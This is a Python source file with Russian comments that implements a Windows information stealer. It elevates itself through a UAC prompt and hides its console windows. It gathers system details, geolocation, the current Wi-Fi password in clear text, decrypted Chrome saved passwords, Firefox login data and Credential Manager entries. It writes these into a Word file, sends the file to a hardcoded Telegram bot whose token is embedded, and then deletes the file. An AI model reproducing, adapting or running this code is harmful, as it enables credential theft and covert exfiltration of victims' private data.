import platform
import socket
import uuid
import psutil
import wmi
import datetime
import requests
import getpass
import os
import subprocess
from winreg import ConnectRegistry, OpenKey, HKEY_LOCAL_MACHINE, QueryValueEx, EnumKey, CloseKey
import win32net
import ctypes
from docx import Document
import sys
import time
import sqlite3
import win32crypt
import shutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64
import json
import re

# Telegram API данные
TELEGRAM_CONFIG = {
    "CHAT_ID": "6086449054",
    "BOT_TOKEN": "6871167004:AAG63-lwqImzNoWPP8Siq6ZFRSfC5GxF-vk",
}
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_CONFIG['BOT_TOKEN']}/sendDocument"
TELEGRAM_MESSAGE_URL = f"https://api.telegram.org/bot{TELEGRAM_CONFIG['BOT_TOKEN']}/sendMessage"

# Флаг для скрытия консоли (только для Windows)
CREATE_NO_WINDOW = subprocess.CREATE_NO_WINDOW

# Словарь переводов для основных разделов (англ/рус)
SECTION_TRANSLATIONS = {
    "System Info": "Сведения о системе",
    "CPU Info": "Информация о процессоре",
    "GPU Info": "Информация о видеокарте",
    "Network Info": "Сетевая информация",
    "Geolocation": "Геолокация",
    "Wi-Fi Info": "Информация о Wi‑Fi",
    "Hardware Info": "Аппаратная информация",
    "Battery Info": "Информация о батарее",
    "Screen Resolution": "Разрешение экрана",
    "BIOS & Motherboard": "BIOS и материнская плата",
    "Installed Software": "Установленное ПО",
    "User & Environment": "Пользователи и переменные среды",
    "Additional Info": "Дополнительная информация",
    "DateTime": "Дата и время"
}

# Переводы для подразделов в разделе Additional Info
ADDITIONAL_TRANSLATIONS = {
    "Device Info": "Информация об устройстве",
    "Monitor Info": "Информация о мониторах",
    "Available Wi-Fi Networks": "Доступные Wi‑Fi сети",
    "Bluetooth Info": "Информация о Bluetooth",
    "RAM Info": "Информация об оперативной памяти",
    "Disk Info": "Информация о дисках",
    "Process Info (Network)": "Информация о процессах (сеть)",
    "Security Info": "Информация по безопасности",
    "Account Info": "Информация об учетных записях",
    "Logs and Debug Info": "Логи и отладочная информация"
}

def run_command(args, shell=False):
    try:
        output = subprocess.check_output(
            args,
            stderr=subprocess.STDOUT,
            shell=shell,
            creationflags=CREATE_NO_WINDOW
        )
        return output.decode("cp866", errors="ignore")
    except Exception:
        return "Not available"

def is_admin():
    try:
        run_command("net session", shell=True)
        print("Admin rights confirmed via 'net session'.")
        return True
    except Exception:
        print("Admin rights check failed via 'net session'.")
        return False

def restart_as_admin():
    script_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
    try:
        print(f"Attempting to restart with admin rights: {script_path}")
        result = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, f'"{script_path}"', None, 1
        )
        if result <= 32:
            print(f"Failed to restart as admin. Return code: {result}")
            return False
        print("UAC prompt displayed. Awaiting confirmation...")
        time.sleep(2)
        sys.exit(0)
    except Exception as e:
        print(f"Restart as admin failed: {e}")
        return False

def get_cpu_temperature():
    try:
        wmi_obj = wmi.WMI(namespace="root\\OpenHardwareMonitor")
        for sensor in wmi_obj.Sensor():
            if sensor.SensorType == "Temperature" and "CPU" in sensor.Name:
                return f"{sensor.Value}°C"
        return "Not detected"
    except Exception:
        return "Not detected"

def get_local_groups():
    try:
        groups = win32net.NetLocalGroupEnum(None, 0)[0]
        return [f"Group: {group['name']}" for group in groups] if groups else ["None found"]
    except Exception:
        return ["None found"]

def get_services():
    try:
        services = []
        for service in psutil.win_service_iter():
            try:
                services.append(f"Name: {service.name()}, Status: {service.status()}")
            except Exception:
                continue
        return services if services else ["None found"]
    except Exception:
        return ["None found"]

def get_drivers():
    try:
        drivers = [f"Name: {driver.Name}, State: {driver.State}" for driver in wmi.WMI().Win32_SystemDriver()]
        return drivers if drivers else ["None found"]
    except Exception:
        return ["None found"]

def get_usb_devices():
    try:
        devices = [f"Name: {usb.Description}" for usb in wmi.WMI().Win32_USBHub()]
        return devices if devices else ["None found"]
    except Exception:
        return ["None found"]

def get_gpu_info():
    try:
        wmi_obj = wmi.WMI()
        gpus = wmi_obj.Win32_VideoController()
        gpu_list = []
        for gpu in gpus:
            memory = f"{gpu.AdapterRAM // (1024 ** 2)} MB" if gpu.AdapterRAM and gpu.AdapterRAM > 0 else "Not available"
            gpu_list.append(f"Name: {gpu.Name}, Memory: {memory}")
        print(f"Detected GPUs: {gpu_list}")
        return gpu_list if gpu_list else ["None found"]
    except Exception:
        return ["None found"]

def get_wifi_info():
    try:
        if not is_admin():
            return {"Wi-Fi Info": "Admin rights required to access Wi-Fi information."}
        
        interfaces_output = run_command(["netsh", "wlan", "show", "interfaces"])
        current_ssid = None
        for line in interfaces_output.splitlines():
            if "SSID" in line and "BSSID" not in line:
                parts = line.split(":", 1)
                if len(parts) > 1:
                    current_ssid = parts[1].strip()
                    break
        if current_ssid:
            current_profile_output = run_command(["netsh", "wlan", "show", "profile", f"name={current_ssid}", "key=clear"])
            current_password = None
            for line in current_profile_output.splitlines():
                for label in ["Key Content", "Содержимое ключа"]:
                    if label in line:
                        parts = line.split(":", 1)
                        if len(parts) > 1:
                            current_password = parts[1].strip()
                            break
                if current_password:
                    break
            return {"Current Wi-Fi": {"SSID": current_ssid, "Password": current_password if current_password else "Not found"}}
        else:
            return {"Current Wi-Fi": {"SSID": "Not connected", "Password": "N/A"}}
    except Exception:
        return {"Wi-Fi Info": "Failed to retrieve"}

def get_installed_programs():
    try:
        programs = []
        reg = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
        for key_path in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
            try:
                key = OpenKey(reg, key_path)
            except Exception:
                continue
            i = 0
            while True:
                try:
                    subkey_name = EnumKey(key, i)
                    subkey = OpenKey(key, subkey_name)
                    try:
                        name = QueryValueEx(subkey, "DisplayName")[0]
                        if name:
                            programs.append(f"Program: {name}")
                    except FileNotFoundError:
                        pass
                    finally:
                        CloseKey(subkey)
                    i += 1
                except OSError:
                    break
            CloseKey(key)
        CloseKey(reg)
        return programs if programs else ["None found"]
    except Exception:
        return ["None found"]

def get_local_users():
    try:
        users = win32net.NetUserEnum(None, 1, 0)[0]
        return [f"User: {user['name']}" for user in users] if users else ["None found"]
    except Exception:
        return ["None found"]

def get_geolocation():
    try:
        for url in ["http://ip-api.com/json/", "https://ipinfo.io/json"]:
            response = requests.get(url, timeout=10)
            data = response.json()
            if data.get("status", "success") == "success" or url.endswith("ipinfo.io/json"):
                return {
                    "Country": data.get("country", "Unknown"),
                    "Region": data.get("regionName", data.get("region", "Unknown")),
                    "City": data.get("city", "Unknown"),
                    "ISP": data.get("isp", data.get("org", "Unknown")),
                    "Lat/Lon": f"{data.get('lat', 'Unknown')}, {data.get('lon', data.get('loc', 'Unknown'))}"
                }
    except Exception:
        return {"Geolocation": "Failed to retrieve"}

def get_environment_vars():
    try:
        return [
            f"PATH: {os.environ.get('PATH', 'Not found')}",
            f"USERNAME: {os.environ.get('USERNAME', 'Not found')}",
            f"USERPROFILE: {os.environ.get('USERPROFILE', 'Not found')}"
        ]
    except Exception:
        return ["Not available"]

def get_bios_info():
    try:
        bios = wmi.WMI().Win32_BIOS()[0]
        return [
            f"Manufacturer: {bios.Manufacturer}",
            f"Name: {bios.Name}",
            f"Version: {bios.Version}",
            f"Serial Number: {bios.SerialNumber}",
            f"Release Date: {bios.ReleaseDate[:4]}-{bios.ReleaseDate[4:6]}-{bios.ReleaseDate[6:8]}"
        ]
    except Exception:
        return ["Failed to retrieve"]

def get_motherboard_info():
    try:
        board = wmi.WMI().Win32_BaseBoard()[0]
        return [
            f"Manufacturer: {board.Manufacturer}",
            f"Product: {board.Product}",
            f"Serial Number: {board.SerialNumber}"
        ]
    except Exception:
        return ["Failed to retrieve"]

def get_cpu_detailed_info():
    try:
        cpus = wmi.WMI().Win32_Processor()
        info = []
        for cpu in cpus:
            info.extend([
                f"Name: {cpu.Name}",
                f"Cores: {cpu.NumberOfCores}",
                f"Max Clock: {cpu.MaxClockSpeed} MHz",
                f"Current Clock: {cpu.CurrentClockSpeed} MHz",
                f"Socket: {cpu.SocketDesignation}"
            ])
        return info if info else ["None found"]
    except Exception:
        return ["None found"]

def get_cpu_detailed():
    try:
        w = wmi.WMI()
        cpus = w.Win32_Processor()
        if cpus:
            cpu = cpus[0]
            logical = cpu.NumberOfLogicalProcessors
            cores = cpu.NumberOfCores
            cache_lines = run_command(["wmic", "cpu", "get", "L2CacheSize,L3CacheSize"]).splitlines()
            l2 = "Not found"
            l3 = "Not found"
            if len(cache_lines) >= 2:
                parts = cache_lines[1].split()
                if len(parts) >= 2:
                    l2 = parts[0] + " KB"
                    l3 = parts[1] + " KB"
            core_load = psutil.cpu_percent(interval=1, percpu=True)
            return {
                "Logical Processors": logical,
                "Cores": cores,
                "Per-Core Load (%)": core_load,
                "L2 Cache": l2,
                "L3 Cache": l3,
                "CPU Temperature": get_cpu_temperature()
            }
    except Exception:
        return {"CPU Detailed": "Not available"}

def get_gpu_detailed():
    try:
        nvidia = shutil.which("nvidia-smi")
        if nvidia:
            output = run_command([nvidia, "--query-gpu=temperature.gpu,utilization.gpu,memory.total,memory.used", "--format=csv,noheader,nounits"])
            parts = output.strip().split(',')
            if len(parts) >= 4:
                return {
                    "GPU Temperature": parts[0].strip() + "°C",
                    "GPU Utilization": parts[1].strip() + "%",
                    "Total VRAM": parts[2].strip() + " MB",
                    "Used VRAM": parts[3].strip() + " MB"
                }
        return {
            "GPU Temperature": "Not available",
            "GPU Utilization": "Not available",
            "Total VRAM": "Not available",
            "Used VRAM": "Not available"
        }
    except Exception:
        return {"GPU Detailed": "Not available"}

def get_monitor_info():
    try:
        output = run_command(["wmic", "desktopmonitor", "get", "ScreenWidth,ScreenHeight,RefreshRate"])
        lines = output.splitlines()
        monitors = []
        if len(lines) >= 2:
            for line in lines[1:]:
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 3:
                        monitors.append({
                            "Resolution": f"{parts[0]}x{parts[1]}",
                            "Refresh Rate": parts[2] + " Hz"
                        })
        return monitors if monitors else "Not available"
    except Exception:
        return "Not available"

def get_network_details():
    try:
        active_connections = run_command(["netstat", "-ano"])
        open_ports = run_command(["netstat", "-an"])
        macs = {}
        for iface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    macs[iface] = addr.address
        traffic = psutil.net_io_counters(pernic=True)
        network_traffic = {iface: counter._asdict() if hasattr(counter, "_asdict") else str(counter)
                          for iface, counter in traffic.items()}
        ipconfig = run_command(["ipconfig", "/all"])
        dns_servers = [line.split(":", 1)[1].strip() for line in ipconfig.splitlines() if "DNS Servers" in line]
        return {
            "Active Connections": active_connections,
            "Open Ports": open_ports,
            "MAC Addresses": macs,
            "Network Traffic": network_traffic,
            "DNS Servers": dns_servers
        }
    except Exception:
        return {"Network Details": "Not available"}

def get_chrome_encryption_key():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        if not os.path.exists(local_state_path):
            return None
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt_chrome_password(encrypted_password, key):
    try:
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'11'):
            nonce = encrypted_password[3:15]
            ciphertext = encrypted_password[15:-16]
            tag = encrypted_password[-16:]
            cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted = decryptor.update(ciphertext) + decryptor.finalize()
            return decrypted.decode("utf-8")
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode("utf-8")
    except Exception:
        return "Not available"

def get_chrome_passwords():
    try:
        chrome_db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        if not os.path.exists(chrome_db):
            return ["Chrome passwords: Database not found"]
        temp_db = "LoginData_temp"
        shutil.copyfile(chrome_db, temp_db)
        key = get_chrome_encryption_key()
        if not key:
            return ["Chrome passwords: Failed to retrieve encryption key"]
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        passwords = []
        for url, username, encrypted_password in cursor.fetchall():
            if url and username and encrypted_password:
                password = decrypt_chrome_password(encrypted_password, key)
                passwords.append(f"URL: {url}, Username: {username}, Password: {password}")
        conn.close()
        os.remove(temp_db)
        return passwords if passwords else ["Chrome passwords: None found"]
    except Exception:
        return ["Chrome passwords: Failed to retrieve"]

def get_firefox_passwords():
    try:
        firefox_profiles_path = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
        if not os.path.exists(firefox_profiles_path):
            return ["Firefox passwords: Profile not found"]
        passwords = []
        for profile in os.listdir(firefox_profiles_path):
            profile_path = os.path.join(firefox_profiles_path, profile)
            logins_file = os.path.join(profile_path, "logins.json")
            if os.path.exists(logins_file):
                with open(logins_file, 'r') as f:
                    data = json.load(f)
                for login in data.get("logins", []):
                    url = login.get("hostname", "Unknown")
                    username = login.get("encryptedUsername", "")
                    password = login.get("encryptedPassword", "")
                    passwords.append(f"URL: {url}, Username: {username} (encrypted), Password: {password} (encrypted)")
        return passwords if passwords else ["Firefox passwords: None found"]
    except Exception:
        return ["Firefox passwords: None found"]

def get_credential_manager_passwords():
    try:
        output = run_command("cmdkey /list", shell=True)
        credentials = []
        current_target = None
        for line in output.splitlines():
            line = line.strip()
            if line.startswith("Target:"):
                current_target = line.split("Target:", 1)[1].strip()
            elif line.startswith("User:") and current_target:
                username = line.split("User:", 1)[1].strip()
                credentials.append(f"Target: {current_target}, Username: {username}, Password: Not accessible")
        return credentials if credentials else ["Credential Manager: None found"]
    except Exception:
        return ["Credential Manager: None found"]

def get_wifi_available():
    try:
        output = run_command(["netsh", "wlan", "show", "networks", "mode=bssid"])
        networks = []
        current_network = {}
        for line in output.splitlines():
            line = line.strip()
            if line.startswith("SSID"):
                parts = line.split(":", 1)
                if len(parts) > 1:
                    if current_network:
                        networks.append(current_network)
                        current_network = {}
                    current_network["SSID"] = parts[1].strip()
            elif line.startswith("BSSID"):
                parts = line.split(":", 1)
                if len(parts) > 1:
                    current_network.setdefault("BSSIDs", []).append(parts[1].strip())
            elif "Signal" in line:
                parts = line.split(":", 1)
                if len(parts) > 1:
                    current_network["Signal"] = parts[1].strip()
        if current_network:
            networks.append(current_network)
        return networks if networks else "Not available"
    except Exception:
        return "Not available"

def get_bluetooth_info():
    try:
        output = run_command(["powershell", "-Command", "Get-PnpDevice -Class Bluetooth"])
        return output if output else "Not available"
    except Exception:
        return "Not available"

def get_ram_info():
    try:
        output = run_command(["wmic", "memorychip", "get", "Speed,MemoryType,Manufacturer,Capacity"])
        return output.strip() if output else "Not available"
    except Exception:
        return "Not available"

def get_disk_info():
    try:
        output = run_command(["wmic", "diskdrive", "get", "Model,InterfaceType,MediaType,Status"])
        return output.strip() if output else "Not available"
    except Exception:
        return "Not available"

def get_process_info():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                conns = proc.connections()
                if conns:
                    processes.append({"PID": proc.pid, "Name": proc.info['name'], "Connections": len(conns)})
            except Exception:
                continue
        return processes if processes else "Not available"
    except Exception:
        return "Not available"

def get_security_info():
    try:
        system_events = run_command(["wevtutil", "qe", "System", "/c:5", "/f:text"])
        av_status = run_command(["wmic", "/namespace:\\\\root\\SecurityCenter2", "path", "AntiVirusProduct", "get", "displayName,productState"])
        active_users = run_command("query user", shell=True)
        login_attempts = run_command(["wevtutil", "qe", "Security", "/c:5", "/f:text"])
        scheduled_tasks = run_command(["schtasks", "/query", "/fo", "LIST"])
        return {
            "Recent System Events": system_events,
            "Antivirus Status": av_status,
            "Active Users/Sessions": active_users,
            "Recent Login Attempts": login_attempts,
            "Scheduled Tasks": scheduled_tasks
        }
    except Exception:
        return {"Security Info": "Not available"}

def get_account_info():
    try:
        ms_accounts = run_command(["dsregcmd", "/status"])
        admin_accounts = run_command(["net", "localgroup", "Administrators"])
        return {
            "Microsoft Accounts": ms_accounts if ms_accounts.strip() else "Not available",
            "Administrator Accounts": admin_accounts,
            "User Groups": get_local_groups()
        }
    except Exception:
        return {"Account Info": "Not available"}

def get_logs_and_debug_info():
    try:
        app_events = run_command(["wevtutil", "qe", "Application", "/c:5", "/f:text"])
        shutdown_events = run_command(["wevtutil", "qe", "System", "/c:5", "/q:*[System[(EventID=1074) or (EventID=6006)]]", "/f:text"])
        uptime_seconds = time.time() - psutil.boot_time()
        uptime_str = str(datetime.timedelta(seconds=int(uptime_seconds)))
        return {
            "Application Events": app_events,
            "Recent Shutdown/Restart Events": shutdown_events,
            "System Uptime": uptime_str
        }
    except Exception:
        return {"Logs and Debug Info": "Not available"}

def get_device_info():
    try:
        serial_lines = run_command(["wmic", "bios", "get", "serialnumber"]).splitlines()
        serial = serial_lines[1].strip() if len(serial_lines) >= 2 else "Not found"
        model_lines = run_command(["wmic", "csproduct", "get", "name"]).splitlines()
        model = model_lines[1].strip() if len(model_lines) >= 2 else "Not found"
        os_install_lines = run_command(["wmic", "os", "get", "InstallDate"]).splitlines()
        os_install = os_install_lines[1].strip() if len(os_install_lines) >= 2 else "Not found"
        bios_lines = run_command(["wmic", "bios", "get", "smbiosbiosversion,releasedate"]).splitlines()
        bios_ver = "Not found"
        bios_date = "Not found"
        for line in bios_lines:
            if line and "smbiosbiosversion" not in line.lower():
                parts = line.split()
                if len(parts) >= 2:
                    bios_ver = parts[0]
                    bios_date = parts[1]
                    break
        return {
            "Device Serial Number": serial,
            "Device Model": model,
            "OS Install Date": os_install,
            "BIOS Version": bios_ver,
            "BIOS Release Date": bios_date
        }
    except Exception:
        return {"Device Info": "Not available"}
    
def get_disk_usage():
    """
    Возвращает список строк с информацией о дисках.
    Если возникла ошибка с конкретным диском, он пропускается.
    """
    usage_info = []
    try:
        partitions = psutil.disk_partitions(all=False)
        for partition in partitions:
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                total_gb = round(usage.total / (1024 ** 3), 2)
                free_gb = round(usage.free / (1024 ** 3), 2)
                usage_info.append(f"{partition.device}: Total: {total_gb} GB, Free: {free_gb} GB")
            except Exception:
                # Если возникает ошибка для конкретного диска, пропускаем его
                continue
        return usage_info
    except Exception as e:
        return [f"Disk Usage: Error occurred - {e}"]

# Структурированный итоговый сбор данных без повторений
def collect_all_info():
    try:
        info = {
            "System Info": {
                "Computer Name": platform.node(),
                "Username": getpass.getuser(),
                "OS": platform.platform(),
                "OS Version": f"{platform.win32_ver()[0]} {platform.win32_ver()[1]}",
                "Architecture": platform.machine(),
                "Processor": platform.processor(),
                "Python Version": platform.python_version(),
                "System Language": platform.win32_ver()[2],
                "Boot Time": datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%d/%m/%Y %H:%M:%S")
            },
            "CPU Info": {
                "Basic": get_cpu_detailed_info(),
                "Detailed": get_cpu_detailed()
            },
            "GPU Info": {
                "Basic": get_gpu_info(),
                "Detailed": get_gpu_detailed()
            },
            "Network Info": {
                "Basic": {
                    "Local IP": socket.gethostbyname(socket.gethostname()),
                    "MAC Address": ':'.join(f"{(uuid.getnode() >> i) & 0xff:02x}" for i in range(0, 8*6, 8)[::-1]),
                    "Hostname": socket.gethostname()
                },
                "Traffic": {iface: counter._asdict() if hasattr(counter, "_asdict") else str(counter)
                           for iface, counter in psutil.net_io_counters(pernic=True).items()}
            },
            "Geolocation": get_geolocation(),
            "Wi-Fi Info": get_wifi_info(),
            "Hardware Info": {
                "Total Memory (GB)": round(psutil.virtual_memory().total / (1024 ** 3), 2),
                "Available Memory (GB)": round(psutil.virtual_memory().available / (1024 ** 3), 2),
                "Disk Usage": get_disk_usage()
            },
            "Battery Info": (["Percent: " + (f"{psutil.sensors_battery().percent}%" if psutil.sensors_battery() else "Not detected"),
                             "Plugged: " + ("Yes" if psutil.sensors_battery() and psutil.sensors_battery().power_plugged else "No" if psutil.sensors_battery() else "N/A"),
                             "Time Left: " + (f"{psutil.sensors_battery().secsleft // 3600}h {(psutil.sensors_battery().secsleft % 3600) // 60}m" if psutil.sensors_battery() and psutil.sensors_battery().secsleft != psutil.POWER_TIME_UNLIMITED else "Unlimited" if psutil.sensors_battery() else "N/A")]
                            if psutil.sensors_battery() else ["Battery: Not detected"]),
            "Screen Resolution": f"{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}",
            "BIOS & Motherboard": {
                "BIOS Info": get_bios_info(),
                "Motherboard Info": get_motherboard_info()
            },
            "Installed Software": {
                "Programs": get_installed_programs(),
                "Services": get_services(),
                "Drivers": get_drivers(),
                "USB Devices": get_usb_devices()
            },
            "User & Environment": {
                "Environment Variables": get_environment_vars(),
                "Local Users": get_local_users(),
                "Local Groups": get_local_groups(),
                "Saved Passwords": {
                    "Chrome Passwords": get_chrome_passwords(),
                    "Firefox Passwords": get_firefox_passwords(),
                    "Credential Manager": get_credential_manager_passwords()
                }
            },
            "Additional Info": {
                "Device Info": get_device_info(),
                "Monitor Info": get_monitor_info(),
                "Available Wi-Fi Networks": get_wifi_available(),
                "Bluetooth Info": get_bluetooth_info(),
                "RAM Info": get_ram_info(),
                "Disk Info": get_disk_info(),
                "Process Info (Network)": get_process_info(),
                "Security Info": get_security_info(),
                "Account Info": get_account_info(),
                "Logs and Debug Info": get_logs_and_debug_info()
            },
            "DateTime": datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        }
        return info
    except Exception as e:
        return {"Error": "Failed to collect all info. Error: {e}"}

def clean_text(text):
    try:
        if not isinstance(text, str):
            text = str(text)
        return re.sub(r'[\x00-\x08\x0B\x0C\x0E-\x1F]', '', text)
    except Exception:
        return "Not available"

def flatten_data(data, prefix=""):
    try:
        lines = []
        if isinstance(data, dict):
            for key, value in data.items():
                new_prefix = f"{prefix}{key}: " if prefix == "" else f"{prefix} -> {key}: "
                lines.extend(flatten_data(value, new_prefix))
        elif isinstance(data, list):
            for item in data:
                lines.extend(flatten_data(item, prefix))
        else:
            lines.append(f"{prefix}{data}")
        return lines
    except Exception:
        return ["Not available"]

def create_word_file(info, filename):
    try:
        doc = Document()
        doc.add_heading("User Data Report / Отчёт о системе", 0)
        for section, data in info.items():
            section_trans = SECTION_TRANSLATIONS.get(section, section)
            section_title = f"{section} / {section_trans}"
            doc.add_heading(clean_text(section_title), level=1)
            lines = flatten_data(data)
            for line in lines:
                doc.add_paragraph(clean_text(line), style='List Bullet')
        doc.save(filename)
        return filename
    except Exception:
        return None

def send_file_to_telegram(file_path):
    try:
        with open(file_path, 'rb') as file:
            response = requests.post(
                TELEGRAM_API_URL,
                data={'chat_id': TELEGRAM_CONFIG["CHAT_ID"]},
                files={'document': file},
                timeout=10
            )
        if response.status_code == 200:
            print("File sent successfully!")
        else:
            print(f"Failed to send file. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending file: {e}")

def send_message_to_telegram(message):
    try:
        params = {
            'chat_id': TELEGRAM_CONFIG["CHAT_ID"],
            'text': str(message)
        }
        response = requests.post(TELEGRAM_MESSAGE_URL, data=params, timeout=10)
        if response.status_code != 200:
            raise Exception(f"Failed to send message. Status code: {response.status_code}")
    except Exception as e:
        # Если отправка в Telegram не удалась, игнорируем ошибку, чтобы не прерывать выполнение
        pass

def main():
    try:
        if not is_admin():
            print("Script not running as admin. Restarting...")
            if not restart_as_admin():
                print("Automatic restart failed. Please run as administrator.")
                return
        
        info = collect_all_info()
        username = getpass.getuser()
        computer_name = platform.node()
        filename = f"{username}_{computer_name}.docx"
        file_path = os.path.join(os.environ["APPDATA"], filename)
        
        created_file = create_word_file(info, file_path)
        if created_file:
            send_file_to_telegram(created_file)
            try:
                os.remove(file_path)
                print(f"File {file_path} sent and deleted.")
            except Exception as e:
                print(f"Error deleting file: {e}")
        else:
            print("Failed to create Word file.")
    except Exception as e:
        print(f"Main execution error: {e}")

if __name__ == "__main__":
    main()